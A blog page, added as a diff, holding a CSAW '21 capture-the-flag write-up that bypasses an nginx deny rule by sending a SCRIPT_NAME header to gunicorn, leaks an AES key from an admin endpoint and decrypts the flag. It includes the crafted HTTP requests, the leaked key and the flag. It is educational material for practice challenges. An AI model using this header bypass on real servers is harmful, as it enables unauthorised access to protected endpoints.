@@ -1,0 +1,168 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>GateKeeping - CSAW &#39;21 Qualifier | 1n73rc3p70r-B10g | Welcome to MY Blog</title>
+
+  
+  <meta name="author" content="Sayooj B Kumar">
+  
+
+  
+  <meta name="description" content="place where i post my findings,ctf write-ups">
+  
+
+  
+  
+  <meta name="keywords" content="Nginx">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="GateKeeping - CSAW &#39;21 Qualifier"/>
+
+  <meta property="og:site_name" content="1n73rc3p70r-B10g"/>
+
+  
+  <meta property="og:image" content="/blog/favicon.ico"/>
+  
+
+  <link href="/blog/favicon.ico" rel="icon">
+  <link rel="alternate" href="/blog/atom.xml" title="1n73rc3p70r-B10g" type="application/atom+xml">
+  <link rel="stylesheet" href="/blog/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/blog/">1n73rc3p70r-B10g</a>
+    </h1>
+    <p class="site-description">Welcome to MY Blog</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>GateKeeping - CSAW &#39;21 Qualifier</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/blog/2021/09/14/CSAW21-Gatekeeping/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-09-13T18:30:00.000Z">
+          2021-09-14
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p><strong>tl;dr</strong></p>
+<ul>
+<li>Bypass nginx’s DENY ALL using <code>SCRIPT_NAME</code></li>
+<li>Calculate key_id uploading <code>flag.txt.enc</code></li>
+<li>Leak the key and decrypt <code>flag.txt.enc</code></li>
+</ul>
+<span id="more"></span>
+
+<p><strong>Challenge points</strong>: 395</p>
+<p><strong>No of solves</strong>: 133</p>
+<p><strong>Solved by</strong>:<a target="_blank" rel="noopener" href="https://twitter.com/_1nt3rc3pt0r_">1nt3rc3pt0r</a>, <a target="_blank" rel="noopener" href="https://twitter.com/Az3z3l">Az3z3l</a></p>
+<h2 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h2><p>My previous flag file got encrypted by some dumb ransomware. They didn’t even tell me how to pay them, so I’m totally out of luck. All I have is the site that is supposed to decrypt my files (but obviously that doesn’t work either).</p>
+<p><strong>Source Code:</strong> <a href="source-code.zip">here</a></p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="Bypassing-Nginx"><a href="#Bypassing-Nginx" class="headerlink" title="Bypassing Nginx"></a>Bypassing Nginx</h3><p><code>SCRIPT_NAME</code> is a header that is sent by the proxy to the backend.<code>SCRIPT_NAME</code> is used to set the request url’s root path so that the application knows its virtual “location”. This may be an empty string , if the application corresponds to the “root” of the server.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /asf/admin/admin/key HTTP/1.1</span><br><span class="line">Host: 172.17.0.2</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">SCRIPT_NAME: /admin</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+
+<p>In this case we are requesting <code>/asf/admin/admin/key</code> while SCRIPT_NAME is set to <code>/admin</code> which means forwarded request to backend will be <code>/admin/key</code>.</p>
+<h3 id="key-id"><a href="#key-id" class="headerlink" title="key-id"></a>key-id</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> decrypt = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> file = <span class="built_in">this</span>.files[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> reader = <span class="keyword">new</span> FileReader();</span><br><span class="line">  reader.onload = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(evt.target.result);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> key_id = data.slice(<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">    key_id = buf2hex(key_id);</span><br><span class="line"></span><br><span class="line">    data = data.slice(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&#x27;result&#x27;</span>).innerHTML = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> error = <span class="function">(<span class="params">e</span>)=&gt;</span>&#123;</span><br><span class="line">      <span class="built_in">document</span>.getElementById(<span class="string">&#x27;result&#x27;</span>).innerHTML = <span class="string">`</span></span><br><span class="line"><span class="string">      &lt;div class=&quot;notification is-danger&quot;&gt;</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;e&#125;</span></span></span><br><span class="line"><span class="string">      &lt;/div&gt;</span></span><br><span class="line"><span class="string">      `</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> res = <span class="keyword">await</span> fetch(<span class="string">&#x27;/decrypt&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">          key_id</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">body</span>: data</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="keyword">if</span> (res.status === <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> dec_data = <span class="keyword">await</span> res.blob();</span><br><span class="line">        <span class="keyword">let</span> a = <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        a.setAttribute(<span class="string">&#x27;href&#x27;</span>, URL.createObjectURL(dec_data));</span><br><span class="line">        a.setAttribute(<span class="string">&#x27;download&#x27;</span>, file.name.split(<span class="string">&#x27;.&#x27;</span>).slice(<span class="number">0</span>,-<span class="number">1</span>).join(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(a);</span><br><span class="line">        a.click();</span><br><span class="line">        <span class="built_in">document</span>.body.removeChild(a);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (res.status === <span class="number">403</span>) &#123;</span><br><span class="line">        error(<span class="string">`You must pay the ransom before you can decrypt your file!`</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="string">&quot;bad&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">      error(<span class="string">`There was an error decrypting your file, please try again later!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  reader.readAsArrayBuffer(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>As you can see that <code>key_id</code> is calculated and updated to the backend using javascript, which means we can upload any file and acquire the key from client-side(index.html).</p>
+<p>As we have to decrypt<code>flag.txt.enc</code>we have to calculate<code>key_id</code>corresponding to<code>flag.txt.enc</code>this could be done by uploading<code>flag.txt.enc</code>and debugging javascript.The calculated<code>key_id</code>is <code>05d1dc92ce82cc09d9d7ff1ac9d5611d</code></p>
+<h3 id="Leaking-the-Key-and-decrypting-flag"><a href="#Leaking-the-Key-and-decrypting-flag" class="headerlink" title="Leaking the Key and decrypting flag"></a>Leaking the Key and decrypting flag</h3><h4 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /asf/admin/admin/key HTTP/1.1</span><br><span class="line">Host: web.chal.csaw.io:5004</span><br><span class="line">key_id: 05d1dc92ce82cc09d9d7ff1ac9d5611d</span><br><span class="line">SCRIPT_NAME: /admin</span><br></pre></td></tr></table></figure>
+
+<h4 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.18.0</span><br><span class="line">Date: Sat, 11 Sep 2021 11:11:10 GMT</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 75</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;key&quot;:&quot;b5082f02fd0b6a06203e0a9ffb8d7613dd7639a67302fc1f357990c49a6541f3&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Decrypting-the-flag"><a href="#Decrypting-the-flag" class="headerlink" title="Decrypting the flag"></a>Decrypting the flag</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decrypt&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>():</span></span><br><span class="line">    key = binascii.unhexlify(<span class="string">&quot;b5082f02fd0b6a06203e0a9ffb8d7613dd7639a67302fc1f357990c49a6541f3&quot;</span>)<span class="comment">#key</span></span><br><span class="line">    data = request.get_data()</span><br><span class="line">    iv = data[:AES.block_size]</span><br><span class="line"></span><br><span class="line">    data = data[AES.block_size:]</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CFB, iv)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(data)</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p>flag{gunicorn_probably_should_not_do_that}</p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/blog/categories/Web-Exploitation/">Web Exploitation</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/blog/tags/Nginx/">Nginx</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 Sayooj B Kumar
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
